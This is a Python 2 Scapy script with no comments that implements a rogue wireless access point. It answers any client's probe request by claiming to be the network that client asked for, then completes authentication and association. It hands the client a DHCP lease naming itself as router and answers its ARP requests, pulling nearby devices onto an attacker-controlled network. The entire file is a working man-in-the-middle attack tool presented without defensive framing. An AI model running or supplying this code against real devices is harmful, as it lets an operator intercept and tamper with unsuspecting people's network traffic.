from scapy.all import *

iface = 'mon0'
channel = 5
cap = 0x2105

client_ip = '10.10.10.1'
server_ip = '10.10.10.10'
subnet_mask = '255.255.255.0'
dns_server = '8.8.8.8'

lease_time = 43200

server_mac = open('/sys/class/net/' + iface + '/address').readline()
server_mac = server_mac[: len(server_mac) - 1]
print server_mac
	
def mac_to_bytes(mac):
    return ''.join(chr(int(x, 16)) for x in mac.split(':'))
    
def probe_resp(ssid, client_mac):
	return (RadioTap() /
		Dot11(addr1=client_mac, addr2=server_mac, addr3=server_mac) /
		Dot11ProbeResp(cap=cap) /
		Dot11Elt(ID='SSID', len=len(ssid), info=ssid) /
		Dot11Elt(ID='DSset', len=len(chr(channel)), info=chr(channel)))

def auth_resp(client_mac, seqnum):
	return (RadioTap() /
		Dot11(addr1=client_mac, addr2=server_mac, addr3=server_mac) /
		Dot11Auth(seqnum=seqnum+1))
		
def asso_resp(client_mac):
	return (RadioTap() /
		Dot11(addr1=client_mac, addr2=server_mac, addr3=server_mac) /
		Dot11AssoResp(cap=cap, status=0))

def dhcp_offer(client_mac, xid):
	return (RadioTap() /
		Dot11(addr1='ff:ff:ff:ff:ff:ff', addr2=server_mac, FCfield='from-DS') /
		LLC(dsap=0xaa, ssap=0xaa, ctrl=0x03) /
		SNAP(OUI=0x000000, code=ETH_P_IP) /
		IP(src=server_ip, dst=client_ip) /
		UDP(sport=67, dport=68) /
		BOOTP(op=2, yiaddr=client_ip, siaddr=server_ip, giaddr=server_ip, chaddr=mac_to_bytes(client_mac), xid=xid) /
		DHCP(options=[('message-type', 'offer')]) /
		DHCP(options=[('subnet_mask', subnet_mask)]) /
		DHCP(options=[('server_id', server_ip)]) /
		DHCP(options=['end']))

def dhcp_ack(client_mac, xid):
	return (RadioTap() /
		Dot11(addr1='ff:ff:ff:ff:ff:ff', addr2=server_mac, FCfield='from-DS') /
		LLC(dsap=0xaa, ssap=0xaa, ctrl=0x03) /
		SNAP(OUI=0x000000, code=ETH_P_IP) /
		IP(src=server_ip, dst=client_ip) /
		UDP(sport=67,dport=68) /
		BOOTP(op=2, yiaddr=client_ip, siaddr=server_ip, giaddr=server_ip, chaddr=mac_to_bytes(client_mac), xid=xid) /
		DHCP(options=[('message-type','ack')]) /
		DHCP(options=[('server_id', server_ip)]) /
		DHCP(options=[('lease_time', lease_time)]) /
		DHCP(options=[('subnet_mask', subnet_mask)]) /
		DHCP(options=[('router', server_ip)]) /
		DHCP(options=[('name_server', dns_server)]) /
		DHCP(options=[('domain', 'localdomain')]) /
		DHCP(options=['end']))

def arp_resp(client_mac):
	return (RadioTap() /
		Dot11(addr1=client_mac, addr2=server_mac, addr3=server_mac, FCfield='from-DS') /
		LLC(dsap=0xaa, ssap=0xaa, ctrl=0x03) /
		SNAP(OUI=0x000000, code=ETH_P_ARP) /
		ARP(psrc=server_ip, pdst=client_ip, op='is-at', hwsrc=server_mac, hwdst=client_mac))

def frame_handler(frame):
	if hasattr(frame, 'addr2'):
		client_mac = str(frame.addr2)
		if (Dot11ProbeReq in frame):
			ssid = frame.info
			if ssid != '':
				print 'MAC = ' + client_mac + ' - SSID = ' + ssid
				sendp(probe_resp(ssid, client_mac), iface = iface, verbose=False)
		elif (hasattr(frame, 'addr1') and str(frame.addr1) == server_mac):
			if (Dot11Auth in frame):
				print 'MAC = ' + client_mac + ' - AUTH'
				sendp(auth_resp(client_mac, frame[Dot11Auth].seqnum), iface = iface, verbose=False)
			elif (Dot11AssoReq in frame):
				print 'MAC = ' + client_mac + ' - ASSO'
				sendp(asso_resp(client_mac), iface = iface, verbose=False)
			elif (DHCP in frame):
				if frame[DHCP].options[0][1] == 1:
					print 'MAC = ' + client_mac + ' - DISC'
					sendp(dhcp_offer(client_mac, frame[BOOTP].xid), iface = iface, verbose=False)
				elif frame[DHCP].options[0][1] == 3:
					print 'MAC = ' + client_mac + ' - REQ'
					sendp(dhcp_ack(client_mac, frame[BOOTP].xid), iface = iface, verbose=False)
			elif (ARP in frame):
				print 'MAC = ' + client_mac + ' - ARP'
				sendp(arp_resp(client_mac), iface = iface, verbose=False)

sniff(iface=iface, prn=frame_handler)
